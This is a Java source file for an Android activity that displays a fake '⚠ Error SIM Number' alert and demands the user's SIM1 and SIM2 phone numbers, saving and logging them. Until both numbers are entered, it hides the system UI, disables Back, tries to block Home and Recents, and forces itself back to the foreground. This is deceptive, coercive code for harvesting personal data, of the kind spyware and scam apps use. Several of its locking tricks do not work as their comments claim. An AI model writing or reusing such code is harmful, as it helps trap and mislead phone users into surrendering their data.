package com.example.fasterpro11;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.text.Editable;
import android.text.InputType;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.TextView;

public class GetSim1AndSim2NumberFromAlertbox extends Activity {
    private static final String TAG = "GetSim1AndSim2NumberFromAlertbox";
    private String sim1NumberFromUser;
    private String sim2NumberFromUser;
    private int sim1Attempts = 0;
    private int sim2Attempts = 0;
    private Context context;
    public String UserID1;
    public String UserID2;
    private boolean isSim1Entered = false;
    private boolean isSim2Entered = false;
    private Handler handler = new Handler();
    public GetSim1AndSim2NumberFromAlertbox() {
        // Default constructor
    }

    public GetSim1AndSim2NumberFromAlertbox(Context context) {
        this.context = context;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.context = this;  // Set the Activity context
        Log.d(TAG, "Activity Created");
        Log.d(TAG, "onCreate showSim1Alert() called");
        hideSystemUI(); // Hide system UI control panel
        lockActivity(); // Lock the activity
        showSim1Alert();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (!isSim1Entered || !isSim2Entered) {
            Log.d(TAG, "Bringing app back to foreground");
            handler.postDelayed(() -> moveTaskToFront(), 500);
            moveTaskToBack(false); // ব্যাকগ্রাউন্ডে যাওয়া বন্ধ করুন
        }
    }

    private void moveTaskToFront() {
        if (!isSim1Entered || !isSim2Entered) {
            moveTaskToBack(false);
            showSim1Alert();
        }
    }


    @Override
    public void onBackPressed() {
        if (!isSim1Entered || !isSim2Entered) {
            // Disable the Back button until both SIM numbers are entered
            Log.d(TAG, "Back button is disabled until both SIM numbers are entered");
            return;
        }
        super.onBackPressed();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Disable Home and Recent buttons by intercepting key events
        if (keyCode == KeyEvent.KEYCODE_HOME || keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
            if (!isSim1Entered || !isSim2Entered) {
                // Prevent Home or Recent button functionality
                Log.d(TAG, "Home/Recent button is disabled until both SIM numbers are entered");
                return true; // Block the action
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    private void lockActivity() {
        // Lock the activity (disable Back, Home, and Recent buttons)
        Window window = getWindow();
        window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
    }

    private void unlockActivity() {
        // Unlock the activity (enable Back, Home, and Recent buttons)
        Window window = getWindow();
        window.clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }

    private void showSim1Alert() {
        Log.d(TAG, "showSim1Alert() called from onCreate");
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("⚠ Error SIM Number");
        builder.setIcon(android.R.drawable.ic_dialog_alert);

        TextView titleView = new TextView(this);
        titleView.setText("⚠ Error SIM Number");
        titleView.setTextColor(Color.RED);
        titleView.setTextSize(20);
        builder.setCustomTitle(titleView);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_PHONE);
        input.setHint("Enter SIM1 Number");
        input.setHintTextColor(Color.GRAY);
        builder.setView(input);

        builder.setPositiveButton("OK", null);
        builder.setCancelable(false);

        final AlertDialog dialog = builder.create();
        dialog.show();
        Log.d(TAG, "SIM1 AlertDialog shown");

        dialog.setCanceledOnTouchOutside(false);

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener(v -> {
            sim1NumberFromUser = input.getText().toString();
            Log.d(TAG, "SIM1 Number entered: " + sim1NumberFromUser);

            if (sim1NumberFromUser.isEmpty() || sim1NumberFromUser.length() < 11 || sim1NumberFromUser.length() > 14) {
                sim1Attempts++;
                Log.d(TAG, "SIM1 Attempts: " + sim1Attempts);
                if (sim1Attempts < 5) {
                    input.setError("Wrong number. Enter SIM1 Number");
                    input.setTextColor(Color.RED);
                    Log.e(TAG, "Wrong SIM1 Number entered");
                } else {
                    showErrorMessage("Maximum attempts reached for SIM1.");
                    sim1NumberFromUser = null;
                    Log.e(TAG, "Maximum attempts reached for SIM1");
                    finish();
                    dialog.dismiss();
                }
            } else {
                saveSim1NumberToSharedPreferences(); // Save SIM1 number to SharedPreferences
                isSim1Entered = true;
                dialog.dismiss();
                Log.d(TAG, "SIM1 Number is valid, proceeding to SIM2");
                showSim2Alert(); // Show SIM2 AlertDialog
            }
        });

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(false);
        Log.d(TAG, "OK button initially disabled");

        input.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {
                boolean isInputValid = charSequence.length() >= 11 && charSequence.length() <= 14;
                dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(isInputValid);
                Log.d(TAG, "Input changed, OK button enabled: " + isInputValid);
            }

            @Override
            public void afterTextChanged(Editable editable) {}
        });
    }

    private void showSim2Alert() {
        Log.d(TAG, "showSim2Alert() called");
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("⚠ Error SIM Number");
        builder.setIcon(android.R.drawable.ic_dialog_alert);

        TextView titleView = new TextView(this);
        titleView.setText("⚠ Error SIM Number");
        titleView.setTextColor(Color.RED);
        titleView.setTextSize(20);
        builder.setCustomTitle(titleView);

        final EditText input = new EditText(this);
        input.setInputType(InputType.TYPE_CLASS_PHONE);
        input.setHint("Enter SIM2 Number");
        input.setHintTextColor(Color.GRAY);
        builder.setView(input);

        builder.setPositiveButton("OK", null);
        builder.setCancelable(false);

        final AlertDialog dialog = builder.create();
        dialog.show();
        Log.d(TAG, "SIM2 AlertDialog shown");

        dialog.setCanceledOnTouchOutside(false);

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener(v -> {
            sim2NumberFromUser = input.getText().toString();
            Log.d(TAG, "SIM2 Number entered: " + sim2NumberFromUser);

            if (sim2NumberFromUser.isEmpty() || sim2NumberFromUser.length() < 11 || sim2NumberFromUser.length() > 14) {
                sim2Attempts++;
                Log.d(TAG, "SIM2 Attempts: " + sim2Attempts);
                if (sim2Attempts < 5) {
                    input.setError("Wrong number. Enter SIM2 Number");
                    input.setTextColor(Color.RED);
                    Log.e(TAG, "Wrong SIM2 Number entered");
                } else {
                    showErrorMessage("Maximum attempts reached for SIM2.");
                    sim2NumberFromUser = null;
                    Log.e(TAG, "Maximum attempts reached for SIM2");
                    finish();
                    dialog.dismiss();
                }
            } else {
                saveSim2NumberToSharedPreferences(); // Save SIM2 number to SharedPreferences
                isSim2Entered = true;
                dialog.dismiss();
                Log.d(TAG, "SIM2 Number is valid, saving SIM numbers");
                unlockActivity(); // Unlock the activity
                finish();
            }
        });

        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(false);
        Log.d(TAG, "OK button initially disabled");

        input.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {
                boolean isInputValid = charSequence.length() >= 11 && charSequence.length() <= 14;
                dialog.getButton(AlertDialog.BUTTON_POSITIVE).setEnabled(isInputValid);
                Log.d(TAG, "Input changed, OK button enabled: " + isInputValid);
            }

            @Override
            public void afterTextChanged(Editable editable) {}
        });
    }

    private void saveSim1NumberToSharedPreferences() {
        Log.d(TAG, "Saving SIM1 number: " + sim1NumberFromUser);
        SharedPreferences sharedPreferences = getSharedPreferences("SimNumbers", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("SIM1", sim1NumberFromUser);
        editor.apply();
        Log.d(TAG, "SIM1 number saved to SharedPreferences");
    }

    private void saveSim2NumberToSharedPreferences() {
        Log.d(TAG, "Saving SIM2 number: " + sim2NumberFromUser);
        SharedPreferences sharedPreferences = getSharedPreferences("SimNumbers", MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("SIM2", sim2NumberFromUser);
        editor.apply();
        Log.d(TAG, "SIM2 number saved to SharedPreferences");
    }

    private void showErrorMessage(String message) {
        Log.e(TAG, "Showing error message: " + message);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage(message)
                .setPositiveButton("OK", null)
                .show();
    }

    public String retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers");
            return null;
        }
        Log.d(TAG, "Starting retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers method");

        SharedPreferences sharedPreferences = context.getSharedPreferences("SimNumbers", MODE_PRIVATE);
        Log.d(TAG, "SharedPreferences initialized with 'SimNumbers'");

        String sim1Number = sharedPreferences.getString("SIM1", null);
        Log.d(TAG, "Retrieved SIM1 Number from SharedPreferences: " + sim1Number);
        return sim1Number;
    }

    public String retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers");
            return null;
        }
        Log.d(TAG, "Starting retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers method");

        SharedPreferences sharedPreferences = context.getSharedPreferences("SimNumbers", MODE_PRIVATE);
        Log.d(TAG, "SharedPreferences initialized with 'SimNumbers'");

        String sim2Number = sharedPreferences.getString("SIM2", null);
        Log.d(TAG, "Retrieved SIM2 Number from SharedPreferences: " + sim2Number);
        return sim2Number;
    }

    public String getSim1NumberFromUser(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in getSim1NumberFromUser");
            return null;
        }
        String sim1Number = retrieveStoredSharedPreferencesUserOwnGiveSim1Numbers(context);
        Log.d(TAG, "getSim1NumberFromUser sim1Number: " + sim1Number);
        return sim1Number;
    }

    public String getSim2NumberFromUser(Context context) {
        if (context == null) {
            Log.e(TAG, "Context is null in getSim2NumberFromUser");
            return null;
        }
        String sim2Number = retrieveStoredSharedPreferencesUserOwnGiveSim2Numbers(context);
        Log.d(TAG, "getSim2NumberFromUser sim2Number: " + sim2Number);
        return sim2Number;
    }

    /**
     * hideSystemUI() - Completely hides the system UI control panel.
     */
    private void hideSystemUI() {
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN);
    }

    /**
     * onAttachedToWindow() - Disables the Back, Home, and Recent app buttons.
     */
    @Override
    public void onAttachedToWindow() {
        super.onAttachedToWindow();
        Window window = getWindow();
        window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }
}